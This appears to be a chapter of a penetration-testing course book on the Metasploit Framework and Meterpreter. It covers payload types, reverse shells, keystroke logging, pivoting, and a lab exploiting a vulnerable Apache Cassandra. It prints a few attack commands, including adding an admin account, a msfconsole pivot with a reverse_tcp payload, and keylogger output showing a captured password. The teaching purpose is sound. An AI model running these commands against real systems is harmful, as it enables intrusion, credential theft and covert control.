- Metasploit is a free, open-source exploitation framework
- What's an exploitation framework?
  - − An environment for running numerous different exploits in a flexible fashion
  - − An environment for creating new exploits, using interchangeable piece parts
  - − Simplifies the creation of new exploits
  - − Standardizes the usage of new exploits
- Runs on Linux, macOS, and Windows
  - − Tested and used most frequently on Debian-derived Linux, though
  - − General advice: Use the best-supported platform whenever possible

![](SEC560_Book2_page_141_Picture_13.jpeg)

The Metasploit Framework (sometimes abbreviated MSF) is a free, open-source exploitation framework. There are similar tools available on a commercial basis, such as Rapid7's Metasploit Pro, Raphael Mudge's Cobalt Strike, Core Security Technologies' IMPACT, and Immunity's CANVAS. But even testers who have access to such commercial tools often augment their arsenal with the free version of Metasploit, a tremendous tool for attacks.

But what is an exploitation framework? It's an environment in which exploits can be used to compromise targets and in which new exploits can be created. A comprehensive exploitation framework like Metasploit offers numerous reusable piece parts and libraries of code that simplify and speed up the process of creating new exploits.

Also, with a large arsenal of exploits, the framework can standardize the usage patterns of exploits. Before exploitation frameworks were widely available in the 2003–2004 time frame, most exploits were one-off affairs, each carefully handcrafted but with widely varying quality and significant differences in how each exploit was used to compromise a target. Exploitation frameworks, especially Metasploit, helped to create some standards for how exploits are built and used.

Metasploit runs on Linux, macOS, and Windows. However, according to the Metasploit documentation for some versions of the tool, "The Metasploit Framework is only partially supported on the Windows platform. If you would like to access most of the Framework features from Windows, we recommend using a virtualization environment, such as VMware, with a supported Linux distribution .…" There is no detailed documentation for which feature may be broken on Windows, so your best bet is to install it on another type of system, such as Linux. If a given feature happens to not function properly in Metasploit on Windows during a penetration test, you will get a false sense of the true vulnerability status of the target machine, making your test far less valuable. Use it on Linux or macOS to help ensure it functions properly.

![](SEC560_Book2_page_142_Figure_0.jpeg)

141

The Metasploit arsenal includes several user interfaces, an exploit collection, and a payload collection. Within the context of Metasploit, an exploit is a piece of code that can take advantage of a given vulnerability in a target program, making it run a payload. The payload is a piece of code that does something on a target machine for the Metasploit user, such as opening up a remotely accessible command shell or gaining remote control of the target machine's GUI. By separating the exploits from the payloads, Metasploit allows us to mix and match a given exploit for a vulnerability that we've discovered in a target environment with a particular payload of our choice that gives us the type of control we need on a target. For example, you might choose a payload that gives remote command shell access on a target Windows machine because you have good command line skills in Windows. Or you might choose a payload with remote GUI control because you are more GUI oriented. Or you may prefer the immense flexibility of the Meterpreter payload, which we'll cover in more detail later. For each given exploit, we often have a dozen or more compatible payloads from which to choose.

The Metasploit user invokes an appropriate interface and uses it to select an exploit and a payload. The user then configures various options for the exploit and payload and uses Metasploit to shoot the results at a target system.

In addition, Metasploit includes numerous auxiliary modules, which provide other attack capabilities, including port scanning, vulnerability checks, DNS interrogation, and a variety of other features.

Metasploit also includes post modules. Penetration testers use these after successfully exploiting a target machine. Many of them are associated with plundering the target for valuable information, while others focus on reconfiguring the target system to bend it to the attacker's will.

Many security researchers release new exploits on a regular basis for newly discovered vulnerabilities as Metasploit modules that are integrated into the Metasploit framework and ready to use. Some researchers work on new payloads, creating new capabilities usable by the exploits already included in Metasploit.

![](SEC560_Book2_page_143_Picture_2.jpeg)

# **Useful Metasploit User Interfaces**

- **msfconsole**: A customized Metasploit command prompt … use this!
- **msfvenom**: Convert a Metasploit payload into a standalone file or other formats (EXE, Linux binary, JavaScript, VBA, C, C#, or raw) and encode it to help evasion
- Programmatic (API) interfaces:
  - − **msfd**: A daemon that listens by default on TCP port 55554, offering up msfconsole access to anyone that connects. No authentication or encryption
  - − **msfrpcd**: Metasploit controllable via XML over Remote Procedure Call, listening on TCP port 55553, offering access via SSL
  - − **REST API**: Introduced with Metasploit version 5 for Metasploit Pro (JSON focused)

Note that we won't go over every single item in these directories but instead focus on those that are most important to penetration testers and ethical hackers who rely on Metasploit.

Let's start with the user interfaces, focusing on the most useful one, the Metasploit console interface called msfconsole. This is a customized Metasploit command prompt with all kinds of useful features, including TAB autocomplete, environment variables, and the capability to run local commands in the local operating system, as well as various custom Metasploit commands such as **exploit**, the command that launches an exploit at a target. For this class, we rely exclusively on this interface because it tends to be the best one for penetration testers and ethical hackers with its great flexibility and useful features.

Alternatively, the msfd program creates a local daemon that listens on TCP port 55554. If anyone connects to it (using a Netcat client, for example, which can make a connection to an arbitrary TCP port), they get Metasploit console access. The idea here is that we can have multiple Metasploit testers all using a single version of Metasploit on one box so that we don't have to worry that they may be using different versions with different updates. By default, msfd allows connections only from localhost, but it can be configured to listen for remote connections. Unfortunately, msfd does not require any authentication, nor does it encrypt the session. Thus, we recommend that you not use it for penetration testing.

The msfrpcd is an instance of Metasploit that listens on TCP port 55553 (with an option to use SSL or not use it), awaiting control messages using XML over RPC. This allows people to create arbitrary client software that can interact with Metasploit and control it.

The msfvenom interface is useful for taking a Metasploit payload (such as a payload that launches a network-accessible Windows shell) and converting it into a file that can be executed in some fashion. Output options include raw binary, Windows EXEs, Linux binary executables, JavaScripts, and VBAs.

143

# **Metasploit Modules**

- **exploits**: Metasploit's exploit arsenal
  - − In Metasploit terminology, **exploit** modules must allow code execution (Denial of Service is under **auxiliary**)
- **payloads**: Metasploit's payload arsenal
- **auxiliary**: Miscellaneous items, including port scanners, vuln checkers, denialof-service tools, and so on
- **post**: Post-exploitation modules for target plundering and manipulation

Metasploit has the following kinds of modules:

**exploits:** Here you have Metasploit's big arsenal of exploitation code.

**payloads:** Metasploit stores its payloads in this directory.

**auxiliary:** This directory contains modules associated with port scanning, scanning for vulnerable systems, launching denial-of-service attacks, and other items that don't fit into other categories.

**post:** These modules run after successful exploitation occurs and support plundering or otherwise manipulating compromised target machines.

144

# **The Metasploit Exploit Arsenal**

Exploits are sorted by operating system.

- **OS**: aix, bsdi, freebsd, hpux, linux, osx, solaris, unix, windows
  - − Contain exploits for the OS, as well as programs that run on that OS
  - − Example: Windows directory includes exploits for Windows and software that runs on Windows (backup tools, games, servers, and more)
- **multi**: Exploits that hit multiple target operating system types, including PHP exploits, Java, and more

other systems (typically client-side)

Now let's zoom in on the exploits. In Metasploit, the exploits are sorted by operating system, with a set for aix, bsdi, dialup, freebsd, hpux, irix, linux, netware, osx (Apple Macintosh OS X), solaris, unix, and windows. The multi-directory contains exploits that may work on multiple operating systems (including some browser attacks, PHP exploits, and Samba exploits). One of the most important multi-exploit modules is exploit/multi/handler, which is a generic listener that waits for a connection from a system running an exploit or attack code outside of this instance of Metasploit. This so-called "multi/handler"

Each directory of exploits for a given operating system contains exploits that target software that is built into that operating system, as well as third-party programs that run on the operating system. For example, the Windows directory contains exploits not only for Windows but also for tools that run on Windows, such as antivirus tools, backup programs, games, mail servers (IMAP and POP3), and so on.

![](SEC560_Book2_page_146_Picture_2.jpeg)

# **Windows Exploits**

- **smb**: Service-side exploits for SMB, including PsExec, one of the most useful modules for attacking a fully patched Windows environment if we have SMB access and admin credentials (such as internally)
- **browser**: Client-side exploits, mostly for Chrome but also includes Edge, Firefox, Internet Explorer, and browser software such as Adobe Flash
- **scada**: Exploits that attack SCADA management systems and SCADA control servers that run on Windows
- **vnc**: Attacks against Virtual Network Computing clients and servers

# Numerous categories, but most useful ones are listed here

Metasploit includes numerous different exploits for Windows targets, split into groups, sorted by the type of element on a Windows machine that the given exploits attack. Some of the most interesting and widely used types follow:

**smb:** These service-side exploits take advantage of flaws in Microsoft's Server Message Block (SMB) implementation, used for Windows file and print sharing as well as numerous other Windows remote access and management features. Among other exploits, this directory also houses the PsExec module, which causes a target Windows machine to run a program of the attacker's choosing, rather like the Microsoft SysInternals PsExec program. A pen tester configures this module with admin credentials and then uses the SMB protocol to make the target machine run the program with local SYSTEM privileges. Because it doesn't rely on a software vulnerability but instead uses normal Windows functionality for making a program run, this Metasploit PsExec module is one of the most useful in all of Metasploit against a fully patched Windows target environment in which the attacker has SMB access (such as across an intranet) and admin credentials.

**browser:** These client-side exploits focus on various browsers (and software running inside browsers) that run on Windows, particularly Chrome, but also including Firefox, Internet Explorer, and Adobe Flash.

**scada:** These exploits target Supervisory Control and Data Acquisition (SCADA) management systems and control servers that run on Windows.

**vnc:** These exploits attack flaws in the Windows version of the Virtual Network Computing (VNC) tool used for the remote GUI control of systems, especially in the SCADA world.

|           | SEC560   Enterprise Penetration Testing                                                                                                                  | 146 |
|-----------|----------------------------------------------------------------------------------------------------------------------------------------------------------|-----|
|           | Rapid7's Exploit Rankings                                                                                                                                |     |
|           |                                                                                                                                                          |     |
| Excellent | The exploit will never crash the service.                                                                                                                |     |
| Great     | The exploit has a default target AND either auto-detects the appropriate target or<br>uses an application-specific return address AFTER a version check. |     |
| Good      | The exploit has a default target, and it is the "common case" for this type of software                                                                  |     |
| Normal    | The exploit is reliable but depends on a specific version and doesn't autodetect.                                                                        |     |
| Average   | The exploit is unreliable or difficult to exploit [includes MS17-010/Eternal Blue].                                                                      |     |
| Low       | The exploit is nearly impossible to exploit for common platforms.                                                                                        |     |
| Manual    | The exploit is unstable or difficult to exploit and is basically a DoS.                                                                                  |     |
|           | Excellent and Great are often safe, but still aren't 100%. Test in your lab first!                                                                       |     |

The folks at Rapid7 have ranked exploits within Metasploit based on their likelihood of success. Below is an excerpt directly from the Metasploit documentation:

| Ranking   | Description                                                                                                                                                                                                                                       |
|-----------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Excellent | The exploit will never crash the service. This is the case for SQL Injection, CMD<br>execution, RFI, LFI, etc. No typical memory corruption exploits should be given this<br>ranking unless there are extraordinary circumstances (WMF Escape()). |
| Great     | The exploit has a default target AND either auto-detects the appropriate target or uses an<br>application-specific return address AFTER a version check.                                                                                          |
| Good      | The exploit has a default target and it is the "common case" for this type of software<br>(English, Windows 7 for a desktop app, 2012 for server, etc.). Exploit does not auto-detect<br>the target.                                              |
| Normal    | The exploit is otherwise reliable, but depends on a specific version that is not the "common<br>case" for this type of software and can't (or doesn't) reliably autodetect.                                                                       |
| Average   | The exploit is generally unreliable or difficult to exploit, but has a success rate of 50% or<br>more for common platforms.                                                                                                                       |
| Low       | The exploit is nearly impossible to exploit (under 50% success rate) for common platforms.                                                                                                                                                        |
| Manual    | The exploit is unstable or difficult to exploit and is basically a DoS (15% success rate or<br>lower). This ranking is also used when the module has no use unless specifically<br>configured by the user (e.g.: exploit/unix/webapp/php_eval).   |

#### Reference:

• https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

# **Metasploit Modules: Payloads**

- **singles**: Standalone payloads that have their functionality and communication bundled together. Also called "stageless" or "standalone" payloads.
- **stagers**: Tiny shellcode that first loads the stage, communicating with the attacker in numerous flexible fashions
- **stages**: The "real" payload, loaded by the stager or embedded into a single.

![](SEC560_Book2_page_148_Figure_7.jpeg)

Next, let's look at the payloads, which come in the following forms:

**singles:** These are standalone payloads that include all their pieces in one module. Both the functionality of the payload and its communication with the attacker are bundled together in each of these payloads. Single payloads are often, but not always, larger since they include all the functionality in the payload. These payloads are also known as stageless or standalone.

**stagers:** Some payloads are broken into multiple pieces, with a stager loaded into the target memory before a follow-on stage. The stagers load the stage into the target machine and implement communications code for it. The stagers directory contains modules that include listening TCP ports, reverse TCP connections, and others.

**stages:** These elements are payload piece parts that implement the functionality of a payload, such as a remote shell, GUI control, and such.

So, some payloads are self-contained, whereas others are broken into a stager and stage. Breaking these payloads into stager and stage is a flexible concept because you can then use almost any stage with almost any stager, choosing the payload functionality you want independent of how you want to communicate with the payload after it is loaded on the target machine.

# **Metasploit Payloads: Windows Singles**

Single-stage payloads/exploits can be useful for when your stage or stager is being flagged by a defensive tool.

| adduser            | Creates an account and adds it to the local admin group |
|--------------------|---------------------------------------------------------|
| exec               | Runs command of attacker's choosing                     |
| download_exec      | Downloads a file via HTTP and executes it               |
| dns_txt_query_exec | Downloads a command via DNS TXT record and executes it  |
| shell_bind_tcp     | Standard TCP shell listener                             |
| shell_reverse_tcp  | Reverses shell back to attacker                         |

Let's consider the Windows singles payload arsenal. Remember, each of these payloads is self-contained, including all functionality for loading the payload into the memory of the target, communicating with the attacker, and doing the attacker's bidding on the target system. These single payloads include:

**adduser:** As its name implies, this payload creates a user account with a name and password of the attacker's choosing and adds that account to the local admin group. You can open this Ruby script in gedit (gedit adduser.rb) and look through its code. If you do, you'll see the commands that it runs on the target: cmd.exe /c net user #{user} #{pass} /ADD and net localgroup Administrators #{user} /ADD.

**exec:** This payload runs a command of the attacker's choosing on the target machine.

**download\_exec:** This payload downloads a program to the target machine via HTTP and then executes the downloaded program.

**dns\_txt\_query\_exec:** Downloads a command via DNS TXT record and executes it.

**shell\_bind\_tcp:** This payload provides cmd.exe shell access via a listening TCP port on the victim machine.

**shell\_reverse\_tcp:** This payload makes a reverse shell connection back to the attacker, implementing inbound shell access to the target machine via an outbound TCP connection back to the attacker.

|                      | SEC560   Enterprise Penetration Testing                              |  |
|----------------------|----------------------------------------------------------------------|--|
|                      | Metasploit Payloads: Windows Stagers                                 |  |
| bind_tcp             | Listens on TCP port                                                  |  |
| bind_ipv6_tcp        | Listens on TCP port, using IPv6                                      |  |
| reverse_tcp          | Reverses connection to TCP port                                      |  |
| reverse_ipv6_tcp     | Reverses TCP over IPv6                                               |  |
| reverse_http         | Carries outbound session on HTTP connections                         |  |
| reverse_https        | Carries outbound session on HTTPS connections                        |  |
| reverse_tcp_allports | Tries connecting back, cycling through all TCP ports (1 to<br>65535) |  |
|                      | Recommended reading: https://redsiege.com/560/stage                  |  |
|                      |                                                                      |  |

The stagers are those payload pieces that can load the rest of a payload into the target's memory and then provide useful communications abilities between the attacker and the loaded payload. Metasploit offers the following useful stagers:

**bind\_tcp:** This stager listens on an attacker-provided TCP port on the target machine, letting Metasploit make an inbound connection to this port for communication with the stage.

**bind\_ipv6\_tcp:** This stager is similar to bind\_tcp but uses IPv6 instead of IPv4 for network communication.

**reverse\_tcp:** This stager makes an outbound TCP connection from the target machine back to the attacker running Metasploit. It implements inbound communication via an outbound connection.

**reverse\_ipv6\_tcp:** This stager is similar to reverse\_tcp but uses IPv6.

**reverse\_http:** This stager carries a session using outbound HTTP from the exploited system back to the attacker, traversing the network through a network firewall and/or web proxy.

**reverse\_https:** This stager carries a session using outbound HTTPS with all data encrypted in the stager.

**reverse\_tcp\_allports:** This stager tries to cycle through all outbound TCP ports (from 1 to 65535) in an attempt to reach back to the attacker for commands to pass to the stage.

As we can see from this list, Metasploit is compatible with IPv6 attacks. Any exploit and stage can use an IPv6 stager, allowing the attacker to communicate with the exploited system over an IPv6 network.

# Recommended reading:

• https://redsiege.com/560/stage

| dllinject   | Injects arbitrary DLL into target memory     |
|-------------|----------------------------------------------|
| upexec      | Uploads and runs an executable               |
| shell       | Windows cmd.exe shell                        |
| vncinject   | Virtual Network Computing remote GUI control |
| meterpreter | Flexible specialized shell environment       |

Both x86 and x64 versions available of Meterpreter, Shell, and VNCinject

The stager's job is to load a stage into memory and provide communication abilities for it. The stage is the function the attacker wants to execute on the target machine, letting the attacker interact with and possibly control the target machine. But what stages does Metasploit offer penetration testers and ethical hackers? We have several options for Windows machines, including:

**dllinject:** This stage injects a DLL of the attacker's choosing into the memory of the target machine. The attacker would require a worthwhile DLL to use, though—perhaps custom code that the attacker wrote just for this test or this target.

**upexec:** This stage uploads an executable to the target machine and runs it.

**shell:** This stage implements a standard cmd.exe shell. So, as you saw a couple slides back, you have a singles shell\_bind\_tcp payload as well as a shell stage that can be loaded via the bind\_tcp stager. Both have the same essential functionality: a cmd.exe listening on a TCP port of the attacker's choosing.

**vncinject:** This stage gives remote Virtual Network Computing (VNC) control of the target, letting the attacker view the target's GUI and control its mouse and keyboard. By default, this stage pops up a Metasploit Courtesy Shell on the target machine, indicating to the user at the console that Metasploit has been used to get VNC control over the system.

**meterpreter:** This amazing stage provides a specialized shell environment designed for computer attackers and is an ideal platform for penetration testers and ethical hackers to control a target machine. We'll zoom in at length on the Meterpreter's capabilities in the next module.

It's important to note that both 32-bit (x86) and 64-bit (x64) versions of the Meterpreter, Shell, and VNCinject stages are available.

![](SEC560_Book2_page_152_Figure_0.jpeg)

The Meterpreter is named after a fusion of the words Metasploit and Interpreter. Most of the hard-core development work in the Meterpreter was done by Skape. This Metasploit payload offers an attacker a self-contained command shell environment that runs from within the memory space of an exploited process. Thus, the Meterpreter doesn't create a separate running process like most other Metasploit payloads and other exploitation tools. Such an extraneous, attacker-created process might be noticed by an investigator. Instead, the Meterpreter is just another DLL loaded into one of the processes on the target machine. The Meterpreter can be extended with additional DLLs sent after the initial overall Meterpreter module is loaded.

Note that because the Meterpreter is entirely memory resident, it disappears on reboot.

Currently, the Meterpreter has been implemented for Windows, Linux, PHP, macOS, and Java target machines.

It is important to note that all control communication between the attacker running Metasploit and the Meterpreter running on the target box is encrypted using TLS, making the tool even stealthier, as its command channel is not cleartext.

Generally, commands run inside meterpreter run on the victim machine! Additional functionality can be run via .NET Assemblies, Beacon Object Files, or shell commands.

We will now go over a sampling of some of the most powerful features of the Meterpreter. Don't think of this as just a laundry list of individual, unrelated commands. Instead, as we go through each command, think about how a penetration tester or ethical hacker could use these commands to do their jobs more effectively. When an exploitable Windows system is discovered, the Meterpreter can be instrumental in maximizing the effectiveness of a tester against that system, so you need to understand its commands in depth. Pay careful attention because you'll soon be performing a lab using these commands.

Some of the base commands included in the Meterpreter follow:

**? / help**: Either of these options displays a summary of the commands available in the Meterpreter, sorted into different functional groups, such as file system, network, and other command sets.

**exit / quit**: Either of these commands exits the Meterpreter session, removing it from the memory of the target machine.

**sysinfo**: This command causes the Meterpreter to show the system name and operating system type of the compromised machine on which the Meterpreter is running.

**shutdown / reboot**: These commands are self-explanatory.

**reg**: This option lets a Meterpreter user read from or write to the Registry of the target machine. Because most Windows configuration options for both the operating system and most installed applications are stored in the Registry, this command gives you fine-grained control over the target system's configuration.

**shell**: Launch a command shell and interact with it.

![](SEC560_Book2_page_154_Picture_0.jpeg)

The Meterpreter includes numerous useful commands for interacting with processes on a compromised target machine. Some of the most useful process-related commands follow:

**getpid**: This command displays the process ID number of the process that the Meterpreter runs inside.

**getuid**: This option returns the user ID name that the Meterpreter runs with, such as SYSTEM.

**ps**: As you might expect, this command shows a complete process list of all running processes on the target machine.

**kill**: This one terminates a given process when provided its process ID number.

**execute**: This command runs a program with the privileges of the process the Meterpreter runs inside. It can be especially helpful if the attacker wants to kick off a cmd.exe or other tool on the target machine.

**migrate**: This is one of the most fascinating process-related commands in the Meterpreter. An attacker can use it to jump from the Meterpreter's current process to a given destination process ID. It injects the Meterpreter DLL into the target process and removes it from the earlier process, letting an attacker hop around between processes. The destination process must have the same or lesser privileges as the process that the Meterpreter is loaded into. An attacker may want to jump to another process for subterfuge or obfuscation. Alternatively, an attacker may decide to jump into a more stable process. When inside a target process, the attacker can use the Meterpreter file system commands to interact with any files that the given process has a read or write lock on. After all, the Meterpreter is now living inside that process, so it can access everything that process has to offer.

|                   | SEC560   Enterprise Penetration Testing                                              | 154 |
|-------------------|--------------------------------------------------------------------------------------|-----|
|                   | Meterpreter Functionality: File System Commands                                      |     |
| cd                | Navigate directory structure                                                         |     |
| lcd               | Change local directories on attacker machine (for<br>positioning upload or download) |     |
| pwd / getwd       | Show the current working directory                                                   |     |
| ls                | List the directory contents in a Linux-like format (no<br>matter the target OS)      |     |
| cat               | Display a file's contents                                                            |     |
| download / upload | Move a file to/from the machine                                                      |     |
| mkdir / rmdir     | Make or remove directories                                                           |     |
| edit              | Edit a file using default editor (typically vi or vim)                               |     |

The Meterpreter offers numerous commands associated with interacting with the file system. This group of commands represents some of the most reliable and robust functionality in the Meterpreter, offering almost all functions a tester would need for interacting with files:

**cd**: This command navigates the file system structure. As you'd expect, dot (**.**) is used to refer to the current directory, and dot-dot (**..**) is its parent.

**lcd**: This command changes directories on the local (attacker) machine.

**pwd** / **getwd**: Both of these commands print the current working directory. Almost everyone uses **pwd**.

**ls**: This command shows the contents of a directory. Directory contents display organized like the familiar **ls -al** output of UNIX and Linux systems, showing read/write/execute (rwx) modes for owner, group, and everyone, as well as the file's size, last modified date/time, and name.

**cat**: This command displays the contents of a file on the screen.

**download** / **upload**: These commands move files to or from the target machine.

**mkdir** / **rmdir**: These commands let the user make or remove a directory.

**edit**: This command causes Metasploit to open a file in a terminal-based editor program. By default, the editor used is typically vi. To insert text, press the "i" key. To append text to a line, press the "a" key. To delete characters, press the "x" key. To get out of edit mode, press "Esc". To save, press ":" and then "w" and then "Enter". To quit, press ":" and "q" and "Enter". To force a write or a quit, follow the "w" or "q" with an "!". This class isn't a tutorial on vi. However, if you are unfamiliar with vi, that list of options should get you started. If you already know vi, you will be happy with the edit option of the Meterpreter.

![](SEC560_Book2_page_156_Figure_0.jpeg)

The Meterpreter includes a handful of commands for interacting with the network interface of the target machine. Although not fully robust, these commands include most of the functionality that a penetration tester would want:

**ipconfig**: This Meterpreter command shows the name, MAC address, IP address, and Netmask for all active interfaces on the machine.

**route**: This option, used by itself, displays the system's routing table. With extra arguments (add/del, subnet, netmask, and gateway), it updates the routing table.

**portfwd**: This command lets the Meterpreter user forward traffic for a given incoming TCP port on the attacker's machine across the Meterpreter session to another machine on a different TCP port. In effect, it turns the target machine running the Meterpreter into a TCP relay, a bounce point for traffic to be sent to another system. By carefully planting the Meterpreter with the appropriate portfwd options, a tester could use this functionality as a pivot to launch exploits at other targets.

To illustrate the port forward feature of Meterpreter, consider this example: Suppose the attacker has compromised a machine called Target1 and has the Meterpreter loaded on that system. In the Meterpreter session, the attacker types the following command:

meterpreter > portfwd add -l 9999 -p 22 -r Target2

This command makes the attacker's machine (not Target1) listen on TCP port 9999. Any connection that comes in on this port will be forwarded across the Meterpreter session between the attacker's machine and Target1. Then, the connection will be forwarded from Target1 to TCP port 22 on Target2. That way, the attacker can make a TCP connection on the attacker's own machine (either by using a client running on that box to connect to localhost or from a separate remote system connecting to the attacker's machine on TCP 9999). The result is a nice pivot through the attacker's machine, through the Meterpreter session, through Target1, and to Target2.

![](SEC560_Book2_page_157_Figure_0.jpeg)

The Meterpreter includes several features for interacting with the console of the target machine. First, it includes the screenshot command, which grabs a JPEG capture of the current user's desktop on the target machine and transfers the file to the penetration tester's system. Metasploit automatically launches the browser to view the image.

The idletime command makes the Meterpreter display the amount of time (in hours, minutes, and seconds) that the GUI of the victim machine has been idle, without user interaction. Thus, the attacker can get a sense of whether a person is sitting in front of the machine. A long idle time implies that the machine is being ignored.

![](SEC560_Book2_page_158_Picture_2.jpeg)

# **Meterpreter Functionality: Keystroke Logger**

- **keyscan\_start**: Start logging keys from meterpreter's current desktop session
- **keyscan\_dump**: Dump new keystrokes to the screen since the last time running this command
- Output includes special keys surrounded by <> (e.g., <Tab>)
- Sometimes it may miss a letter or reverse two characters

meterpreter > **keyscan\_start** Starting the keystroke sniffer ... meterpreter > **keyscan\_dump** Dumping captured keystrokes... Shift>Here's some normal text that <Shift>I'm typing <LALT><Tab>chris.elgee<Tab> <Shift>My<Shift>Passw0rd<Right Shift>!<CR>

Helpful for determining passwords and other sensitive information

The Meterpreter also includes a keystroke logging feature that can be invoked using the keyscan\_start command. For this command to take effect, the process in which the Meterpreter is running must have access to the current user's desktop. This can be accomplished by using process migration to jump into a process currently displayed on the user's machine, such as the Windows explorer.exe process.

The keyscan\_start command causes the system to poll every 30 milliseconds for keystrokes entered into the system. A 1-megabyte buffer is allocated in memory to hold keystrokes. The attacker can then pull down the keystrokes by running the keyscan\_dump command, which flushes the buffer, displaying the keystrokes on the attacker's Meterpreter screen.

The keyscan\_stop command tells the Meterpreter to stop gathering all keystrokes.

![](SEC560_Book2_page_159_Picture_2.jpeg)

#### **Meterpreter Functionality: Pivoting Using Metasploit's route Command**

**route** allows you to pivot through an existing Meterpreter session.

- Carries follow-on exploits and payloads across Meterpreter session
- Don't confuse this with the Meterpreter route command, which manages routing tables on systems running Meterpreter

```
msf > use exploit1
msf > set RHOSTS victim1
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > exploit
meterpreter > (CTRL-Z to background session… will display meterpreter sid)
msf > route add victim2_subnet netmask sid
msf > use exploit2
msf > set RHOSTS victim2
msf > set PAYLOAD payload2
msf > exploit
                                                                   Victim1
                                                            Exploit1
                                                           Meterpreter
                                                    Pen Tester Victim2
                                                                          Exploit2
                                                                          Payload2
```

Metasploit includes a built-in feature for pivoting attacks through already-established Meterpreter sessions, implemented in the Metasploit route command. Do not confuse the Metasploit (msf) route command with the Meterpreter route command. The latter is used to manage the routing tables on a target box that has been compromised using the Meterpreter payload. The msf route command is used to direct all traffic for a given target subnet from the attacker's Metasploit machine through a given Meterpreter session on a compromised victim machine to another potential victim.

To make this clearer, consider this scenario, illustrated by the commands and figure on this slide: A penetration tester uses exploit1 with a Meterpreter payload to compromise Victim1. The attacker now has a Meterpreter session connected from her machine to Victim1. The pen tester can then press the CTRL-Z keys to background the Meterpreter session. At the msf > prompt, the attacker can run the route command to tell Metasploit to direct any of its packets for a given target machine or subnet through that Meterpreter session. Thus, when we run an exploit for a separate machine (call it Victim2) on that subnet, we'll be pivoting our attack through Victim1.

The syntax of the route command to add a pivot includes providing the subnet address to which we want our traffic routed over the Meterpreter session, followed by a netmask to indicate which bits of that subnet address are relevant. (For example, to attack an individual Victim2, we'd enter the full IP address of Victim2 and use a netmask of 255.255.255.255.) We then specify which Meterpreter session number to route the traffic over. Finally, we configure and launch our attack against Victim2. All traffic from Metasploit to Victim2 will be carried over the Meterpreter session through Victim1, giving us some nice pivot action.

![](SEC560_Book2_page_160_Picture_2.jpeg)

# **Meterpreter Functionality: Additional Modules**

- The Core and Stdapi modules loaded by default are powerful
- But other modules provide useful capabilities for the tester
- To load additional modules:

meterpreter > **use** *module\_name*

- Additional functionality will appear
- **?** / **help** will be expanded to include the new capabilities
- Run **use -l** (lowercase L) to list available modules

By default, when the Meterpreter payload is sent to a target, it carries with it the Core functionality (for example, help, interacting with channels, and process migration) and Stdapi functions (for example, file system, process, and network interactions). But Metasploit supports the loading of additional modules (implemented as DLLs) into the Meterpreter at any time after exploitation has occurred. These modules can provide some useful functionality to a penetration tester or ethical hacker, extending the functionality of the Meterpreter. Metasploit stores these DLLs in the framework directory of the attacking machine, inside data/meterpreter/. Three modules included in this directory are metsrv.dll (which implements the Core functionality), ext\_server\_stdapi.dll (which provides Stdapi functions), and one we haven't yet covered, ext\_server\_priv.dll. We'll go over that last one shortly.

To have the Meterpreter load a new module, use the following command after the Meterpreter has been loaded into the target system by an exploit:

meterpreter > use *module\_name*

The modulename is usually the last component of the DLL name. So, to load the ext\_server\_priv.dll, run

meterpreter > use priv

The appropriate module will be loaded into the memory of the target machine, extending the functionality of the Meterpreter. The help command's output will be extended to include a list and description of the new features.

Other people could write additional extensions for the Meterpreter, giving it new capabilities bundled together in another DLL. One of the most powerful aspects of the Meterpreter is its modular extendibility.

![](SEC560_Book2_page_161_Picture_2.jpeg)

# **Overview: Lab 2.5: Metasploit and Meterpreter**

In this lab, we'll exploit a vulnerable version of the Apache Cassandra for Windows

- And inject a reverse shell Meterpreter payload
- Apache Cassandra is a Java based open source NoSQL database server

![](SEC560_Book2_page_161_Picture_7.jpeg)

service that you put on your Windows machine temporarily. Specifically, going to exploit an older version of Apache Cassandra. Up to version 2.1.3, Apache Cassandra created an unauthenticated RMI/JMX interface, which allows us to execute arbitrary Java code by submitting a malicious RMI request. Our Metasploit payload will consist of the Java Meterpreter stage, loaded via the reverse\_http stager, making a connection from the exploited box back to our Linux system..

You'll run this lab entirely on your own systems, with the vulnerable Cassandra service on your Windows box getting exploited by your Linux virtual machine. On the slide, we depict the high-level process of the exploit to help you understand the vulnerability and the attack.


